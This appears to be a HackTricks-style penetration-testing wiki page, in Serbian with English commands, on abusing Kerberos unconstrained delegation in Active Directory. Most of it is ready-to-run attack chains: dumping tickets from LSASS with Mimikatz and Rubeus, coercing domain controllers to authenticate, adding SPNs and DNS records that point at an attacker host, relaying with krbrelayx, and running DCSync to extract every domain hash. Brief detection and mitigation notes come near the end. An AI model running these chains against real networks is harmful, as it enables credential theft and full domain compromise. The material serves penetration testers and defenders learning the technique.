# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Ovo je funkcija koju Domain Administrator može da podesi na bilo kom **Computer** objektu unutar domena. Nakon toga, svaki put kada se **user prijavi** na taj Computer, **kopija TGT-a** tog user-a biće **poslata unutar TGS-a** koji obezbeđuje DC **i sačuvana u memoriji LSASS-a**. Dakle, ako imate Administrator privilegije na toj mašini, moći ćete da **dump-ujete tikete i impersonirate user-e** na bilo kojoj mašini.

Ako se, dakle, Domain Administrator prijavi na Computer sa aktiviranom funkcijom "Unconstrained Delegation", a vi na toj mašini imate local admin privilegije, moći ćete da dump-ujete tiket i impersonirate Domain Administrator-a bilo gde (domain privesc).

Možete **pronaći Computer objekte sa ovim atributom** proverom da li atribut [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) sadrži [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). To možete uraditi pomoću LDAP filtera ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, što upravo radi powerview:
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Učitajte ticket Administratora (ili victim user-a) u memoriju pomoću **Mimikatz**-a ili **Rubeus**-a za [**Pass the Ticket**](pass-the-ticket.md)**.**\
Više informacija: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Više informacija o Unconstrained delegation na ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>

### **Force Authentication**

Ako attacker uspe da **kompromituje računar dozvoljen za "Unconstrained Delegation"**, može da **prevari** **Print server** da se **automatski prijavi** na njega, čime se **TGT** čuva u memoriji servera.\
Zatim attacker može da izvrši **Pass the Ticket attack kako bi impersonirao** nalog računara Print servera.

Da biste naterali Print server da se prijavi na bilo koji računar, možete koristiti [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Ako je TGT sa domain controllera, možete izvršiti [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) i dobiti sve hash-eve sa DC-a.\
[**Više informacija o ovom napadu na ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>

Ovde pronađite druge načine da **prinudite autentifikaciju:**


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

Bilo koji drugi coercion primitive koji primorava žrtvu da se autentifikuje pomoću **Kerberos-a** na vaš unconstrained-delegation host takođe funkcioniše. U modernim okruženjima to često znači zamenu klasičnog PrinterBug toka sa **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN** ili coercion-om zasnovanim na **WebClient/WebDAV**, u zavisnosti od toga koja je RPC površina dostupna.

### Zloupotreba user/service account-a sa unconstrained delegation

Unconstrained delegation nije **ograničen samo na computer objekte**. **User/service account** takođe može biti konfigurisan kao `TRUSTED_FOR_DELEGATION`. U tom scenariju, praktični zahtev je da account mora primati Kerberos service tickets za **SPN koji poseduje**.

Ovo vodi do 2 veoma česta ofanzivna pravca:

1. Kompromitujete lozinku/hash unconstrained-delegation **user account-a**, a zatim tom istom account-u **dodate SPN**.
2. Account već ima jedan ili više SPN-ova, ali jedan od njih pokazuje na **zastareli/dekomisionirani hostname**; ponovno kreiranje nedostajućeg **DNS A record-a** dovoljno je za hijacking toka autentifikacije bez menjanja SPN skupa.<sup>[[8]](#references)</sup>

Minimalni Linux tok:
```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```
Napomene:

- Ovo je naročito korisno kada je unconstrained principal **service account**, a imate samo njegove kredencijale, bez code execution-a na joined host-u.
- Ako ciljni korisnik već ima **stale SPN**, ponovno kreiranje odgovarajućeg **DNS record-a** može biti manje upadljivo od upisivanja novog SPN-a u AD.
- Savremeni Linux-centric tradecraft koristi `addspn.py`, `dnstool.py`, `krbrelayx.py` i jednu coercion primitivu; nije potrebno da koristite Windows host da biste završili lanac.

### Zloupotreba Unconstrained Delegation-a pomoću računara koji je kreirao napadač

Moderni domeni često imaju `MachineAccountQuota > 0` (podrazumevana vrednost je 10), što svakom autentifikovanom principal-u omogućava da kreira do N computer objekata. Ako takođe posedujete `SeEnableDelegationPrivilege` token privilege (ili ekvivalentna prava), možete podesiti novokreirani computer tako da mu se veruje za unconstrained delegation i preuzimati dolazne TGT-ove sa privilegovanih sistema.<sup>[[1]](#references)</sup>

Tok na visokom nivou:

1) Kreirajte computer koji kontrolišete
```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```
2) Omogućite razrešavanje lažnog hostname-a unutar domena
```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
--action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
-dns-ip <DC_IP> <DC_FQDN>
```
3) Omogućite Unconstrained Delegation na računaru pod kontrolom napadača
```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```
Zašto ovo funkcioniše: kod unconstrained delegation-a, LSA na računaru sa omogućenom delegacijom kešira dolazne TGT-ove. Ako prevarite DC ili privileged server da se autentifikuje na vašem lažnom hostu, njegov mašinski TGT će biti sačuvan i može se eksportovati.

4) Pokrenite krbrelayx u export režimu i pripremite Kerberos materijal
```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```
5) Iznudite autentikaciju od DC-a/servera ka vašem lažnom hostu
```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```
krbrelayx će sačuvati ccache datoteke kada se računar autentifikuje, na primer:
```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```
6) Iskoristite preuzeti TGT DC mašine za izvođenje DCSync-a
```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Napomene i zahtevi:

- `MachineAccountQuota > 0` omogućava kreiranje računara bez privilegija; u suprotnom su vam potrebna eksplicitna prava.
- Postavljanje `TRUSTED_FOR_DELEGATION` na računaru zahteva `SeEnableDelegationPrivilege` (ili privilegije domain admin-a).
- Obezbedite razrešavanje imena za vaš lažni host (DNS A zapis), kako bi DC mogao da mu pristupi putem FQDN-a.
- Coercion zahteva funkcionalan vektor (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN itd.). Ako je moguće, onemogućite ih na DC-ovima.
- Ako je nalog žrtve označen kao **"Account is sensitive and cannot be delegated"** ili je član grupe **Protected Users**, prosleđeni TGT neće biti uključen u service ticket, tako da ovaj lanac neće omogućiti dobijanje ponovo upotrebljivog TGT-a.<sup>[[9]](#references)</sup>
- Ako je **Credential Guard** omogućen na klijentu/serveru koji se autentifikuje, Windows blokira **Kerberos unconstrained delegation**, što iz perspektive operatora može dovesti do neuspeha inače validnih coercion putanja.

Ideje za detekciju i hardening:

- Upozoravajte na Event ID 4741 (kreiran nalog računara) i 4742/4738 (izmenjen nalog računara/korisnika) kada je postavljen UAC `TRUSTED_FOR_DELEGATION`.
- Nadgledajte neuobičajena dodavanja DNS A zapisa u domenskoj zoni.
- Pratite nagle poraste broja 4768/4769 sa neočekivanih hostova i autentifikacije DC-ova prema hostovima koji nisu DC-ovi.
- Ograničite `SeEnableDelegationPrivilege` na minimalan broj naloga, postavite `MachineAccountQuota=0` gde je izvodljivo i onemogućite Print Spooler na DC-ovima. Primenite LDAP signing i channel binding.

### Mitigation

- Ograničite DA/Admin prijavljivanja na određene servise
- Za privilegovane naloge postavite "Account is sensitive and cannot be delegated".

## Reference

- [1] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [2] [harmj0y – S4U2Pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [3] [ired.team – Domain compromise via unrestricted delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [4] [krbrelayx](https://github.com/dirkjanm/krbrelayx)
- [5] [Impacket addcomputer.py](https://github.com/fortra/impacket)
- [6] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [7] [netexec (CME fork)](https://github.com/Pennyw0rth/NetExec)
- [8] [Praetorian – Unconstrained Delegation in Active Directory](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/)
- [9] [Microsoft Learn – Protected Users Security Group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [10] [ired.team – Domain compromise via DC print server and Kerberos delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

{{#include ../../banners/hacktricks-training.md}}
